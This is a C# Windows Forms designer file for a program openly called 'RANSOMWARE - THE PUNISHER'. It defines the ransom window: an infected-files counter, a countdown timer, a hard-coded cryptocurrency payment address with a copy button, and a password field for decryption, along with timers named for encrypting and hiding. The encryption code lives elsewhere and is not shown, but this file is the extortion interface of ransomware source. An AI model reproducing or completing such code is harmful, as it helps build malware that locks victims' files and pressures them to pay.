namespace ransomware
{
    partial class ransomware
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ransomware));
            this.txtbox_password = new System.Windows.Forms.TextBox();
            this.btn_decrypt = new System.Windows.Forms.Button();
            this.ransomware_icon = new System.Windows.Forms.PictureBox();
            this.label_decrypt = new System.Windows.Forms.Label();
            this.label_timer = new System.Windows.Forms.Label();
            this.var_timer = new System.Windows.Forms.Label();
            this.label_countfiles = new System.Windows.Forms.Label();
            this.var_countfiles = new System.Windows.Forms.Label();
            this.label_title = new System.Windows.Forms.Label();
            this.label_description = new System.Windows.Forms.Label();
            this.txtbox_addr = new System.Windows.Forms.TextBox();
            this.btn_copyaddr = new System.Windows.Forms.Button();
            this.tmr_hide = new System.Windows.Forms.Timer(this.components);
            this.tmr_encrypt = new System.Windows.Forms.Timer(this.components);
            this.tmr_clock = new System.Windows.Forms.Timer(this.components);
            this.tmr_if = new System.Windows.Forms.Timer(this.components);
            this.tmr_show = new System.Windows.Forms.Timer(this.components);
            ((System.ComponentModel.ISupportInitialize)(this.ransomware_icon)).BeginInit();
            this.SuspendLayout();
            // 
            // txtbox_password
            // 
            this.txtbox_password.BackColor = System.Drawing.Color.White;
            this.txtbox_password.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtbox_password.Location = new System.Drawing.Point(295, 404);
            this.txtbox_password.Name = "txtbox_password";
            this.txtbox_password.Size = new System.Drawing.Size(418, 28);
            this.txtbox_password.TabIndex = 3;
            this.txtbox_password.KeyDown += new System.Windows.Forms.KeyEventHandler(this.txtbox_KeyDown);
            // 
            // btn_decrypt
            // 
            this.btn_decrypt.Font = new System.Drawing.Font("Microsoft Sans Serif", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btn_decrypt.Location = new System.Drawing.Point(413, 438);
            this.btn_decrypt.Name = "btn_decrypt";
            this.btn_decrypt.Size = new System.Drawing.Size(214, 53);
            this.btn_decrypt.TabIndex = 4;
            this.btn_decrypt.Text = "Decrypt";
            this.btn_decrypt.UseVisualStyleBackColor = true;
            this.btn_decrypt.Click += new System.EventHandler(this.btn_decrypt_Click);
            // 
            // ransomware_icon
            // 
            this.ransomware_icon.BackColor = System.Drawing.Color.Transparent;
            this.ransomware_icon.Image = ((System.Drawing.Image)(resources.GetObject("ransomware_icon.Image")));
            this.ransomware_icon.InitialImage = null;
            this.ransomware_icon.Location = new System.Drawing.Point(25, 38);
            this.ransomware_icon.Name = "ransomware_icon";
            this.ransomware_icon.Size = new System.Drawing.Size(222, 190);
            this.ransomware_icon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.ransomware_icon.TabIndex = 6;
            this.ransomware_icon.TabStop = false;
            // 
            // label_decrypt
            // 
            this.label_decrypt.AutoSize = true;
            this.label_decrypt.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label_decrypt.ForeColor = System.Drawing.Color.White;
            this.label_decrypt.Location = new System.Drawing.Point(290, 368);
            this.label_decrypt.Name = "label_decrypt";
            this.label_decrypt.Size = new System.Drawing.Size(393, 29);
            this.label_decrypt.TabIndex = 7;
            this.label_decrypt.Text = "Enter the valid password to decrypt:";
            // 
            // label_timer
            // 
            this.label_timer.AutoSize = true;
            this.label_timer.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label_timer.ForeColor = System.Drawing.Color.White;
            this.label_timer.Location = new System.Drawing.Point(37, 368);
            this.label_timer.Name = "label_timer";
            this.label_timer.Size = new System.Drawing.Size(113, 29);
            this.label_timer.TabIndex = 9;
            this.label_timer.Text = "Time left:";
            // 
            // var_timer
            // 
            this.var_timer.AutoSize = true;
            this.var_timer.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.var_timer.ForeColor = System.Drawing.Color.White;
            this.var_timer.Location = new System.Drawing.Point(35, 404);
            this.var_timer.Name = "var_timer";
            this.var_timer.Size = new System.Drawing.Size(149, 39);
            this.var_timer.TabIndex = 10;
            this.var_timer.Text = "00:00:00";
            // 
            // label_countfiles
            // 
            this.label_countfiles.AutoSize = true;
            this.label_countfiles.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label_countfiles.ForeColor = System.Drawing.Color.White;
            this.label_countfiles.Location = new System.Drawing.Point(37, 256);
            this.label_countfiles.Name = "label_countfiles";
            this.label_countfiles.Size = new System.Drawing.Size(154, 29);
            this.label_countfiles.TabIndex = 11;
            this.label_countfiles.Text = "Infected files:";
            // 
            // var_countfiles
            // 
            this.var_countfiles.AutoSize = true;
            this.var_countfiles.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.var_countfiles.ForeColor = System.Drawing.Color.White;
            this.var_countfiles.Location = new System.Drawing.Point(35, 296);
            this.var_countfiles.Name = "var_countfiles";
            this.var_countfiles.Size = new System.Drawing.Size(36, 39);
            this.var_countfiles.TabIndex = 12;
            this.var_countfiles.Text = "0";
            // 
            // label_title
            // 
            this.label_title.AutoSize = true;
            this.label_title.Font = new System.Drawing.Font("Microsoft Sans Serif", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label_title.ForeColor = System.Drawing.Color.White;
            this.label_title.Location = new System.Drawing.Point(290, 38);
            this.label_title.Name = "label_title";
            this.label_title.Size = new System.Drawing.Size(411, 29);
            this.label_title.TabIndex = 13;
            this.label_title.Text = "RANSOMWARE - THE PUNISHER";
            // 
            // label_description
            // 
            this.label_description.AutoSize = true;
            this.label_description.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label_description.ForeColor = System.Drawing.Color.White;
            this.label_description.Location = new System.Drawing.Point(302, 95);
            this.label_description.Name = "label_description";
            this.label_description.Size = new System.Drawing.Size(386, 200);
            this.label_description.TabIndex = 14;
            this.label_description.Text = resources.GetString("label_description.Text");
            this.label_description.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // txtbox_addr
            // 
            this.txtbox_addr.BackColor = System.Drawing.Color.White;
            this.txtbox_addr.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtbox_addr.Location = new System.Drawing.Point(295, 307);
            this.txtbox_addr.Name = "txtbox_addr";
            this.txtbox_addr.ReadOnly = true;
            this.txtbox_addr.Size = new System.Drawing.Size(418, 28);
            this.txtbox_addr.TabIndex = 15;
            this.txtbox_addr.Text = "1FNuqQpSxpdYoqus2cFPSqFSz8qQikxVNm";
            // 
            // btn_copyaddr
            // 
            this.btn_copyaddr.Location = new System.Drawing.Point(719, 307);
            this.btn_copyaddr.Name = "btn_copyaddr";
            this.btn_copyaddr.Size = new System.Drawing.Size(54, 28);
            this.btn_copyaddr.TabIndex = 16;
            this.btn_copyaddr.Text = "Copy";
            this.btn_copyaddr.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.btn_copyaddr.UseVisualStyleBackColor = true;
            this.btn_copyaddr.Click += new System.EventHandler(this.btn_copyaddr_Click);
            // 
            // tmr_hide
            // 
            this.tmr_hide.Enabled = true;
            this.tmr_hide.Interval = 5000;
            // 
            // tmr_encrypt
            // 
            this.tmr_encrypt.Enabled = true;
            this.tmr_encrypt.Interval = 1000;
            // 
            // tmr_clock
            // 
            this.tmr_clock.Enabled = true;
            this.tmr_clock.Interval = 600000;
            // 
            // tmr_if
            // 
            this.tmr_if.Enabled = true;
            this.tmr_if.Interval = 300;
            // 
            // tmr_show
            // 
            this.tmr_show.Enabled = true;
            this.tmr_show.Interval = 1000;
            // 
            // ransomware
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.DarkRed;
            this.ClientSize = new System.Drawing.Size(794, 526);
            this.Controls.Add(this.btn_copyaddr);
            this.Controls.Add(this.txtbox_addr);
            this.Controls.Add(this.label_description);
            this.Controls.Add(this.label_title);
            this.Controls.Add(this.var_countfiles);
            this.Controls.Add(this.label_countfiles);
            this.Controls.Add(this.var_timer);
            this.Controls.Add(this.label_timer);
            this.Controls.Add(this.label_decrypt);
            this.Controls.Add(this.ransomware_icon);
            this.Controls.Add(this.btn_decrypt);
            this.Controls.Add(this.txtbox_password);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "ransomware";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Ransomware";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.ransomware_icon)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox txtbox_password;
        private System.Windows.Forms.Button btn_decrypt;
        private System.Windows.Forms.PictureBox ransomware_icon;
        private System.Windows.Forms.Label label_decrypt;
        private System.Windows.Forms.Label label_timer;
        private System.Windows.Forms.Label var_timer;
        private System.Windows.Forms.Label label_countfiles;
        private System.Windows.Forms.Label var_countfiles;
        private System.Windows.Forms.Label label_title;
        private System.Windows.Forms.Label label_description;
        private System.Windows.Forms.TextBox txtbox_addr;
        private System.Windows.Forms.Button btn_copyaddr;
        private System.Windows.Forms.Timer tmr_hide;
        private System.Windows.Forms.Timer tmr_encrypt;
        private System.Windows.Forms.Timer tmr_clock;
        private System.Windows.Forms.Timer tmr_if;
        private System.Windows.Forms.Timer tmr_show;
    }
}

